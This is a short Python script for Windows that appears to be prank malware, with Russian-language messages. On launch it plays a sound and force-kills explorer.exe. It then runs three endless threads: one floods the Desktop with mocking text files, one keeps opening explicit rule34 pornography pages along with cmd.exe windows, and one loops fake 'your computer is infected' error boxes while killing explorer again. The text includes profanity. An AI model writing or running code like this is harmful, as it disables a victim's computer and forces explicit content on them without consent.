import os
from threading import Thread
import tkinter.messagebox
import webbrowser
import subprocess as sp
from winsound import PlaySound
from playsound import *

playsound("gjgjgj(1).mp3")
sp.Popen('taskkill /im explorer.exe /f')
def loop1():
    while True:
        i = 0
        for i in range(200):
            i += 1
            g = "уууууух ты шалун " + str(i)
            path = os.getenv("USERPROFILE")
            path = path + "\\Desktop\\%s.txt"% g
            f = open(path, "w", encoding="utf-8")
            f.write("бляяяяя, ты скачал какую-то парашу из инета -9999999 социал кредит, качай только проверенное по")
            f.close()

def loop2():
    while True:
        t = 0
        for t in range(5):
            t += 1
            webbrowser.open('https://rule34.xxx/index.php?page=post&s=list&tags=gay', new=1)
            os.startfile("C:/Windows/System32/cmd.exe")
            webbrowser.open('https://rule34.xxx/index.php?page=post&s=list&tags=yaoi', new=1)
            os.startfile("C:/Windows/System32/cmd.exe")
            webbrowser.open('https://rule34.xxx/index.php?page=post&s=list&tags=femboy', new=1)
            os.startfile("C:/Windows/System32/cmd.exe")


def loop3():
    while True:
        tkinter.messagebox.showerror(title="ТОБI ПIЗДА", message="ВАШ ЭВМ ЗАРАЖЁН ГАЧИ-ВИРУСОМ")
        os.system("taskkill /im explorer.exe")
 
Thread(target=loop1).start()
Thread(target=loop2).start()
Thread(target=loop3).start()